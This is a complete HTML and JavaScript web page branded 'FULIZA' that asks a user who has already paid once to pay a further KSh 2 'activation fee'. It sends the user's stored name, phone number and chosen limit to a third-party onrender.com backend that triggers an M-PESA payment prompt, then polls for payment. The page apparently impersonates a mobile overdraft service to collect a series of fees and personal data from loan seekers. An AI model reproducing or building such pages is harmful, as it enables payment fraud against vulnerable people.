<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>FULIZA | Activation</title>

<style>

*{
    box-sizing:border-box;
}

body{
    margin:0;
    padding:16px 10px;
    font-family:Arial,sans-serif;
    background:#00A651;
    color:#FFFFFF;
}

.container{
    width:100%;
    max-width:430px;
    margin:0 auto;
}

.card{
    width:100%;
    background:
        linear-gradient(
            145deg,
            rgba(255,255,255,0.09),
            rgba(255,255,255,0.035)
        );

    padding:22px 18px 20px;
    border-radius:18px;

    box-shadow:
        0 20px 60px rgba(0,0,0,0.45),
        inset 0 1px 0 rgba(255,255,255,0.05);

    border:1px solid #000000;
}

.success{
    width:70px;
    height:70px;
    margin:0 auto 14px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#FFFFFF;
    color:#000000;

    border:2px solid #000000;
    border-radius:50%;

    font-size:38px;
    font-weight:800;
}

h1{
    text-align:center;
    background:#000000;
    color:#FFFFFF;

    font-size:26px;
    font-weight:800;

    margin:2px 0 16px;
    padding:10px;

    border:1px solid #FFFFFF;
    border-radius:10px;
}

p{
    text-align:center;
    font-size:14px;
    line-height:1.6;
    color:#FFFFFF;
}

.name{
    color:#FFFFFF;
    font-weight:800;
}

.amount{
    background:#000000;
    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:16px 10px;
    margin:18px 0;

    text-align:center;

    color:#FFFFFF;

    font-size:28px;
    font-weight:800;
}

.info{
    margin-top:18px;

    background:#000000;

    border:1px solid #FFFFFF;
    border-radius:12px;

    padding:14px;
}

.row{
    display:flex;
    justify-content:space-between;
    align-items:center;

    gap:10px;
    padding:10px 0;

    border-bottom:1px solid
        rgba(255,255,255,0.25);
}

.row:last-child{
    border-bottom:none;
}

.label{
    font-size:13px;
    color:#FFFFFF;
}

.value{
    font-size:14px;
    font-weight:800;
    color:#FFFFFF;
    text-align:right;
    word-break:break-word;
}

.notice{
    margin-top:18px;

    padding:13px;

    background:rgba(255,255,255,0.10);

    border:1px solid #FFFFFF;
    border-radius:10px;

    color:#FFFFFF;

    font-size:13px;
    line-height:1.5;

    text-align:center;
}

button{
    width:100%;
    padding:15px;
    margin-top:10px;

    background:#000000;
    color:#FFFFFF;

    border:1px solid #FFFFFF;
    border-radius:11px;

    font-size:16px;
    font-weight:800;

    cursor:pointer;

    box-shadow:
        0 10px 30px rgba(0,0,0,0.30);
}

button:active{
    transform:scale(.98);
}

button:disabled{
    background:rgba(255,255,255,0.25);
    color:#FFFFFF;

    cursor:not-allowed;
    box-shadow:none;
}

#noBtn{
    background:rgba(0,0,0,0.35);
}

#message{
    min-height:22px;
    margin-top:13px;

    color:#FFFFFF;

    font-size:13px;
    font-weight:600;

    line-height:1.5;
    text-align:center;
}

.footer{
    margin-top:15px;
    text-align:center;

    font-size:12px;
    color:#FFFFFF;
}

@media(max-width:360px){

    body{
        padding:10px 7px;
    }

    .card{
        padding:18px 13px 15px;
        border-radius:15px;
    }

    h1{
        font-size:23px;
    }

    button{
        padding:14px;
        font-size:15px;
    }

}

</style>

</head>

<body>

<div class="container">

<div class="card">

<div class="success">
    ✓
</div>

<h1>
    Activation
</h1>

<p>
    Congratulations,
    <span class="name" id="name">
        Applicant
    </span>
</p>

<p>
    Your previous payment has been
    successfully received.
</p>

<div class="amount">
    Activation Fee: KSh 2
</div>

<div class="info">

    <div class="row">

        <div class="label">
            M-PESA Number
        </div>

        <div class="value" id="phone">
            —
        </div>

    </div>

    <div class="row">

        <div class="label">
            Activation Fee
        </div>

        <div class="value">
            KSh 2
        </div>

    </div>

</div>

<div class="notice">

    Are you ready to pay the KSh 2 activation
    fee? Choose an option below.

</div>

<button
    type="button"
    id="yesBtn"
    onclick="payActivation()"
>
    Yes, I'm Ready to Pay
</button>

<button
    type="button"
    id="noBtn"
    onclick="cancelActivation()"
>
    No, Not Now
</button>

<p id="message"></p>

<div class="footer">
    FULIZA
</div>

</div>

</div>


<script>

/* =====================================================
   EXISTING FULIZA BACKEND
===================================================== */

const BACKEND_URL =
    "https://fuliza-backend-1-o8h6.onrender.com";


/* =====================================================
   ACTIVATION FEE
===================================================== */

const ACTIVATION_FEE = 2;


/* =====================================================
   CUSTOMER DETAILS
===================================================== */

const savedName =
    localStorage.getItem(
        "fulizaFullName"
    ) ||
    "Applicant";


const savedPhone =
    localStorage.getItem(
        "fulizaaPhoneNumber"
    ) ||
    localStorage.getItem(
        "phoneNumber"
    ) ||
    "";


/* =====================================================
   DISPLAY NAME
===================================================== */

const firstName =
    savedName
        .trim()
        .split(/\s+/)[0] ||
        "Applicant";


document.getElementById(
    "name"
).textContent =
    firstName;


/* =====================================================
   NORMALIZE PHONE
===================================================== */

function normalizePhone(phone){

    let value =
        String(phone || "")
            .trim()
            .replace(/\s+/g,"")
            .replace(/-/g,"");


    if(
        value.startsWith("+254")
    ){

        value =
            value.substring(1);

    }


    if(
        /^(07|01)\d{8}$/.test(value)
    ){

        value =
            "254" +
            value.substring(1);

    }


    return value;

}


/* =====================================================
   DISPLAY PHONE
===================================================== */

const phone =
    normalizePhone(
        savedPhone
    );


document.getElementById(
    "phone"
).textContent =
    phone ||
    "Not available";


/* =====================================================
   CREATE ACTIVATION REFERENCE
===================================================== */

function createActivationReference(){

    return (
        "ACT-" +
        Date.now()
            .toString(36)
            .toUpperCase()
    );

}


/* =====================================================
   CUSTOMER SELECTS NO
===================================================== */

function cancelActivation(){

    const message =
        document.getElementById(
            "message"
        );


    localStorage.setItem(
        "fulizaaActivationDecision",
        "NO"
    );


    message.textContent =
        "Activation payment has not been started.";

}


/* =====================================================
   CUSTOMER SELECTS YES
===================================================== */

async function payActivation(){

    const btn =
        document.getElementById(
            "yesBtn"
        );


    const noBtn =
        document.getElementById(
            "noBtn"
        );


    const message =
        document.getElementById(
            "message"
        );


    /* -----------------------------------------
       VALIDATE M-PESA NUMBER
    ----------------------------------------- */

    if(
        !/^254\d{9}$/.test(phone)
    ){

        message.textContent =
            "A valid M-PESA number is required.";

        return;

    }


    /* -----------------------------------------
       CUSTOMER AGREED
    ----------------------------------------- */

    localStorage.setItem(
        "fulizaaActivationDecision",
        "YES"
    );


    /* -----------------------------------------
       CREATE REFERENCE
    ----------------------------------------- */

    const reference =
        createActivationReference();


    localStorage.setItem(
        "fulizaaActivationReference",
        reference
    );


    localStorage.setItem(
        "fulizaaActivationAmount",
        ACTIVATION_FEE
    );


    /* -----------------------------------------
       DISABLE BUTTONS
    ----------------------------------------- */

    btn.disabled = true;

    noBtn.disabled = true;

    btn.textContent =
        "Sending STK Push...";


    message.textContent =
        "Please wait. Sending the KSh 2 activation prompt to your M-PESA phone...";


    /* -----------------------------------------
       CALL EXISTING STK ENDPOINT
    ----------------------------------------- */

    try{

        const response =
            await fetch(
                BACKEND_URL +
                "/api/stk-push",
                {

                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:JSON.stringify({

                        phone:
                            phone,

                        amount:
                            ACTIVATION_FEE,

                        selectedLimit:
                            Number(
                                localStorage.getItem(
                                    "fulizaaSelectedLimit"
                                ) ||
                                localStorage.getItem(
                                    "fulizaaSelectedSlot"
                                ) ||
                                0
                            ),

                        fullName:
                            savedName,

                        reference:
                            reference

                    })

                }
            );


        /* -----------------------------------------
           READ RESPONSE
        ----------------------------------------- */

        const responseText =
            await response.text();


        let data = {};


        if(
            responseText.trim()
        ){

            try{

                data =
                    JSON.parse(
                        responseText
                    );

            }catch(error){

                throw new Error(
                    "Server returned an invalid response."
                );

            }

        }


        console.log(
            "ACTIVATION STK RESPONSE:",
            data
        );


        /* -----------------------------------------
           SERVER ERROR
        ----------------------------------------- */

        if(
            !response.ok ||
            !data.success
        ){

            throw new Error(

                data.message ||
                data.error ||
                "Unable to send activation STK Push."

            );

        }


        /* -----------------------------------------
           SAVE TRANSACTION
        ----------------------------------------- */

        if(
            data.transactionId
        ){

            localStorage.setItem(
                "fulizaaActivationTransactionId",
                data.transactionId
            );

        }


        if(
            data.reference
        ){

            localStorage.setItem(
                "fulizaaActivationReference",
                data.reference
            );

        }


        localStorage.setItem(
            "fulizaaActivationStatus",
            "SENT"
        );


        /* -----------------------------------------
           STK SENT
        ----------------------------------------- */

        btn.textContent =
            "Waiting for Payment...";


        message.textContent =
            "STK Push sent successfully. Check your M-PESA phone and enter your PIN.";


        /* -----------------------------------------
           CHECK PAYMENT
        ----------------------------------------- */

        if(
            data.transactionId
        ){

            checkActivationPayment(
                data.transactionId
            );

        }else{

            throw new Error(
                "No transaction ID was returned."
            );

        }


    }catch(error){

        console.error(
            "ACTIVATION STK ERROR:",
            error
        );


        localStorage.setItem(
            "fulizaaActivationStatus",
            "FAILED"
        );


        message.textContent =
            error.message ||
            "Activation payment request failed.";


        btn.disabled =
            false;


        noBtn.disabled =
            false;


        btn.textContent =
            "Yes, I'm Ready to Pay";

    }

}


/* =====================================================
   CHECK ACTIVATION PAYMENT
===================================================== */

function checkActivationPayment(
    transactionId
){

    const btn =
        document.getElementById(
            "yesBtn"
        );


    const noBtn =
        document.getElementById(
            "noBtn"
        );


    const message =
        document.getElementById(
            "message"
        );


    let attempts = 0;

    const maxAttempts = 100;


    if(
        window.activationChecker
    ){

        clearInterval(
            window.activationChecker
        );

    }


    window.activationChecker =
        setInterval(
            async function(){

                attempts++;


                try{

                    const response =
                        await fetch(

                            BACKEND_URL +
                            "/api/payment-status/" +
                            encodeURIComponent(
                                transactionId
                            ),

                            {
                                method:"GET",
                                cache:"no-store"
                            }

                        );


                    const data =
                        await response
                            .json()
                            .catch(
                                () => ({})
                            );


                    console.log(
                        "ACTIVATION STATUS:",
                        data
                    );


                    const status =
                        String(
                            data.status || ""
                        ).toUpperCase();


                    /* ---------------------------------
                       PAYMENT COMPLETED
                    --------------------------------- */

                    if(
                        status ===
                        "COMPLETED"
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        localStorage.setItem(
                            "fulizaaActivationStatus",
                            "COMPLETED"
                        );


                        if(
                            data.mpesaReceipt
                        ){

                            localStorage.setItem(
                                "fulizaaActivationMpesaReceipt",
                                data.mpesaReceipt
                            );

                        }


                        btn.textContent =
                            "Activation Successful";


                        noBtn.disabled =
                            true;


                        message.textContent =
                            "Congratulations! Your KSh 2 activation fee has been received successfully.";


                        /*
                         * Change this page name to whatever
                         * your next page is called.
                         */

                        setTimeout(
                            function(){

                                window.location.replace(
                                    "activation-success.html"
                                );

                            },
                            1500
                        );


                        return;

                    }


                    /* ---------------------------------
                       PAYMENT FAILED
                    --------------------------------- */

                    if(
                        status ===
                        "FAILED"
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        localStorage.setItem(
                            "fulizaaActivationStatus",
                            "FAILED"
                        );


                        message.textContent =
                            "The KSh 2 activation payment was not completed.";


                        btn.disabled =
                            false;


                        noBtn.disabled =
                            false;


                        btn.textContent =
                            "Yes, I'm Ready to Pay";


                        return;

                    }


                    /* ---------------------------------
                       TIMEOUT
                    --------------------------------- */

                    if(
                        attempts >=
                        maxAttempts
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        message.textContent =
                            "Payment confirmation is taking longer than expected. Please check your payment status before trying again.";


                        btn.disabled =
                            false;


                        noBtn.disabled =
                            false;


                        btn.textContent =
                            "Yes, I'm Ready to Pay";

                    }


                }catch(error){

                    console.error(
                        "ACTIVATION STATUS ERROR:",
                        error
                    );


                    /*
                     * Temporary status-request errors
                     * do not immediately mark payment
                     * as failed.
                     */

                    if(
                        attempts >=
                        maxAttempts
                    ){

                        clearInterval(
                            window.activationChecker
                        );


                        message.textContent =
                            "Unable to confirm the activation payment right now.";


                        btn.disabled =
                            false;


                        noBtn.disabled =
                            false;


                        btn.textContent =
                            "Yes, I'm Ready to Pay";

                    }

                }

            },
            3000
        );

}

</script>

</body>

</html>
